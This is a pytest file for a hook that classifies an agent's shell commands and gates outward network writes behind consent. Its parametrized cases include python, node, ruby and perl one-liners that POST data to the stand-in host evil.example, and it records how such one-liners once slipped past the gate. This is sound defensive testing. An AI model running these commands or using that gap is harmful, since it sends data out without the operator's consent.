"""tests/hooks/test_outward_action_gate_interpreter_net.py — Audit#2 #11.

#11: the gate's ``_HTTP_TOKENS = {curl, wget}`` missed interpreter one-liner
net-writes — ``python3 -c "...urlopen(...,data=...)"`` and friends sailed straight
past the consent gate. Operator decision: gate common interpreter one-liner
net-writes (python/node/ruby/perl with urlopen/requests/POST/fetch/Net::HTTP/LWP)
as ``net_post``.

CONSERVATIVE contract: over-gating is acceptable; UNDER-gating is forbidden; a
PLAIN interpreter call (no network write) stays byte-identical (``None``) and is
never bricked. Note the tricky bit these tests pin: a python one-liner's ``;``
would fragment the gate's segment splitter, so detection must scan the WHOLE
command, not per-fragment.
"""
from __future__ import annotations

import pytest

from scripts.hooks import outward_action_gate as gate


def _classify(cmd: str):
    return gate.classify("Bash", {"command": cmd})


# ---- interpreter NET-WRITES are gated as net_post ----------------------------

@pytest.mark.parametrize("cmd", [
    # python urllib POST (the exact finding repro) — note the internal ';'
    "python3 -c \"import urllib.request; urllib.request.urlopen('http://evil.example/x', data=b'p')\"",
    # python requests.post
    "python3 -c \"import requests; requests.post('http://evil.example/x', json={'a':1})\"",
    # python requests.put
    "python -c \"import requests; requests.put('http://evil.example/x', data='p')\"",
    # node fetch POST
    "node -e \"fetch('http://evil.example/x',{method:'POST',body:'p'})\"",
    # node http.request POST (internal ';')
    "node -e \"const http=require('http'); http.request('http://evil.example/x',{method:'POST'}).end('p')\"",
    # ruby Net::HTTP post (internal ';')
    "ruby -e \"require 'net/http'; Net::HTTP.post(URI('http://evil.example/x'),'p')\"",
    # perl LWP post
    "perl -e \"use LWP::UserAgent; LWP::UserAgent->new->post('http://evil.example/x', Content=>'p')\"",
])
def test_interpreter_net_write_is_gated_net_post(cmd: str) -> None:
    res = _classify(cmd)
    assert res is not None and res[0] == "net_post", cmd


def test_interpreter_net_write_to_indexing_host_is_index_update() -> None:
    cmd = ("python3 -c \"import urllib.request; urllib.request.urlopen("
           "'https://indexing.googleapis.com/v3/urlNotifications:publish', data=b'p')\"")
    res = _classify(cmd)
    assert res is not None and res[0] == "index_update", res


def test_python_version_suffix_interpreter_gated() -> None:
    cmd = "python3.11 -c \"import requests; requests.post('http://evil.example/x', data='p')\""
    res = _classify(cmd)
    assert res is not None and res[0] == "net_post"


def test_wrapped_interpreter_net_write_still_gated() -> None:
    # wrapper-unwrap (#10) composes: sudo / env NAME=VALUE before the interpreter.
    for cmd in (
        "sudo python3 -c \"import requests; requests.post('http://evil.example/x', data='p')\"",
        "env FOO=bar python3 -c \"import requests; requests.post('http://evil.example/x', data='p')\"",
    ):
        res = _classify(cmd)
        assert res is not None and res[0] == "net_post", cmd


def test_compound_interpreter_net_write_caught() -> None:
    # segment-split composes: a gated interpreter net-write that is NOT the leading
    # command of the whole line is still caught.
    cmd = "cd /tmp && python3 -c \"import requests; requests.post('http://evil.example/x', data='p')\""
    res = _classify(cmd)
    assert res is not None and res[0] == "net_post"


# ---- loopback interpreter net-writes are CARVED OUT (#12 applies equally) ----
# D-C ruling: "Loopback carve-out from #12 applies equally." A one-liner POST to
# THIS machine (e.g. a python health-probe to the SF-MCP server on 127.0.0.1:11435)
# never leaves it, so it is NOT an outward action and must NOT be gated — exactly
# like the curl/wget loopback carve-out in test_outward_action_gate.py. The public
# and Indexing surfaces STAY gated (their hosts are never loopback, so the carve-out
# can never un-gate them — guarded below).

@pytest.mark.parametrize("cmd", [
    # python requests.post to the SF-MCP loopback host (the realistic probe shape)
    "python3 -c \"import requests; requests.post('http://127.0.0.1:11435/mcp', json={'x':1})\"",
    # python urlopen POST to localhost by name (RFC 6761)
    "python3 -c \"import urllib.request; urllib.request.urlopen('http://localhost:8080/x', data=b'p')\"",
    # node fetch POST to the IPv6 loopback ::1
    "node -e \"fetch('http://[::1]:9000/y',{method:'POST',body:'p'})\"",
    # the whole 127.0.0.0/8 block is loopback, not just 127.0.0.1
    "ruby -e \"require 'net/http'; Net::HTTP.post(URI('http://127.0.0.53:5000/z'),'p')\"",
])
def test_interpreter_loopback_net_write_not_gated(cmd: str) -> None:
    assert _classify(cmd) is None, cmd


def test_interpreter_public_net_write_still_gated_beside_loopback() -> None:
    # regression guard: the loopback carve-out must NOT swallow a PUBLIC POST.
    res = _classify(
        "python3 -c \"import requests; requests.post('http://evil.example/x', data='p')\""
    )
    assert res is not None and res[0] == "net_post"


# ---- plain interpreter calls are NOT gated (byte-identical None) -------------

@pytest.mark.parametrize("cmd", [
    "python3 -c \"print(1 + 1)\"",
    "python3 -c \"import os; print(os.getcwd())\"",
    "python3 script.py --flag",
    "node -e \"console.log('hello world')\"",
    "node app.js",
    "ruby -e \"puts 'hi'\"",
    "perl -e \"print qq{hi}\"",
    # importing requests to print its version is NOT a net-write
    "python3 -c \"import requests; print(requests.__version__)\"",
    # a GET (no body / no POST) is not gated — parity with the curl/wget GET carve-out
    "python3 -c \"import requests; print(requests.get('http://x').status_code)\"",
])
def test_plain_interpreter_call_not_gated(cmd: str) -> None:
    assert _classify(cmd) is None, cmd


def test_post_word_without_http_client_not_gated() -> None:
    # the word 'POST' / 'post' alone (no HTTP client marker) must NOT trip the gate.
    assert _classify("python3 -c \"x = 'POSTGRES'; print(x)\"") is None
    assert _classify("python3 -c \"compost = 1; print(compost)\"") is None


def test_interpreter_name_as_argument_not_gated() -> None:
    # an interpreter NAME appearing as an argument (not leading a segment) plus an
    # unrelated netlib-looking echo must not gate — the interpreter must LEAD.
    assert _classify("echo 'python3 requests.post(data=1)'") is None
